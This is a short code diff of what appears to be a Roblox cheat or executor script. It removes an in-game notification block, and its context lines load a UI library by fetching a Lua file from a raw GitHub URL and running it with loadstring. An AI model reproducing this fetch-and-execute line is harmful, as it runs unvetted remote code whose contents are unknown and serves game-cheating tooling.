@@ -1,13 +1,3 @@
-game:GetService("StarterGui"):SetCore("SendNotification",{
-    Title = "北极星",
-    Text = "Permission = true",
-    Icon = "rbxassetid://17240832325",
-    Duration = 60,
-    Callback = bindable,
-    Button1 = "invalid",
-    Button2 = "Effective opening"
-})
-
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/zilinskaslandon/-/refs/heads/main/VeaMSRZK.lua"))()
 local LBLG = Instance.new("ScreenGui", getParent)
 local LBL = Instance.new("TextLabel", getParent)
